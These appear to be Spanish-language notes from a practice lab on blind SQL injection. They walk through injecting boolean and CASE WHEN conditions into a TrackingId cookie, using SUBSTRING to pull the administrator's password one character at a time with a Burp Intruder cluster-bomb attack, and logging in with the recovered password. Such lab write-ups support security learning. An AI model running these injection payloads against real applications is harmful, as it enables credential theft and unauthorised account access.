## Objetivo:

![[Pasted image 20240623145107.png]]

## Solución:

Entrar a cualquier parte de la aplicacion donde nos muestrel mensaje de "Welcome Back"

![[Pasted image 20240623145146.png]]

Vemos que manipulando la cookie "TrackingId" podemos llegar a hacer saltar ese "Welcome Back" o no dependiendo de si le enviamos una query valida...

Supongamos que la query que esta internamente se ve algo asi:

```
SELECT * FROM tracking WHERE trackingId = 'miCookie';
```

Entonces inyectaremos lo siguiente:

```
2m3EUUqs6qMUIIGY' AND 1=1 -- -
```

De esta manera hacemos que se cumplan ambas condiciones... Y como vemos el mensaje de "Welcome" si se muestra, y si intentamos con `2m3EUUqs6qMUIIGY' AND 1=2 -- -` no se muestra por que la segunda condicion NO se cumple.

![[Pasted image 20240623145410.png]]

![[Pasted image 20240623145610.png]]

Ya con esto podemos guiarnos para hacer la respectiva inyeccion a ciegas...

Podemos ir haciendo pruebas de la siguiente manera.
```
2m3EUUqs6qMUIIGY' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE NULL END)='a' -- -
2m3EUUqs6qMUIIGY' AND (SELECT CASE WHEN (1=2) THEN 'a' ELSE NULL END)='a' -- -
```

![[Pasted image 20240623150110.png]]

![[Pasted image 20240623150212.png]]

Una vez acertada una query y vemos que podemos manipular hasta cierto punto la query interna del servidor ahora tocaría implementar otra query la cual nos sirva para poder enumerar caracteres de la contraseña de dicho usuario, en todo caso esto NO solo serviría para contraseñas si no para cualquier cosa que querramos hacer...

Luego podemos usar la tecnica del SUBSTRING cosa que esta sintax cambiaría dependiendo de la Base de Datos que esté por detras. Para esto podriamos usar la query anterior pero metiendole un SUBSTRING y metiendole palabras "en duro" antes que metamos la columna de contraseña...
Por ejemplo:

```
2m3EUUqs6qMUIIGY' AND (SELECT CASE WHEN (SUBSTRING('hola', 1, 1)='h') THEN 'a' ELSE NULL END)='a' -- -

2m3EUUqs6qMUIIGY' AND (SELECT CASE WHEN (SUBSTRING('fhola', 1, 1)='h') THEN 'a' ELSE NULL END)='a' -- -
```


![[Pasted image 20240623150904.png]]


![[Pasted image 20240623150931.png]]

Ahora si haremos la query definitiva para explotar todo esto...

```
2m3EUUqs6qMUIIGY' AND (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1)='h') THEN 'a' ELSE NULL END)='a' -- -
```

Toda esta request la enviamos al Intruder, seleccionamos ataque de tipo Cluster Bomb  y como variable seleccionamos el "1, 1" y el string luego este "h"...

![[Pasted image 20240623151810.png]]


En el Payload #1 metemos la lista de indices para usar en el Substring y deshabilitamos la opcion de "Url encode"

![[Pasted image 20240623152022.png]]

Y el Payload #2 metemos la lista de letras de a-z y numeros de 0-9 y quitamos la marca de "Url Encode"

![[Pasted image 20240623152134.png]]

Le metemos un Grep al "Welcome Back!" (Para esto, antes de hacer el Refect Response asegurate de meter una consulta valida para poder hacer saltar el mensaje de Welcome y luego haces le Grep y ya luego metes la query para explotar todo)

![[Pasted image 20240623152350.png]]


Luego le damos a comenzar ataque


![[Pasted image 20240623153407.png]]


Iremos anotando cada uno de los caracteres del payload en donde veamos que nos devuelva "Welcome back!" y los anotaremos en el orden de la lista de "Payload#1"  por ejemplo:
1, 1
2, 1
3, 1
En este caso sería "p3p" los primeros 3 caracteres de la contraseña...
La contraseña completa sería "p3pb9ivw3qeycbzk6rmo", ahora solo quedaría iniciar sesión

![[Pasted image 20240623153634.png]]

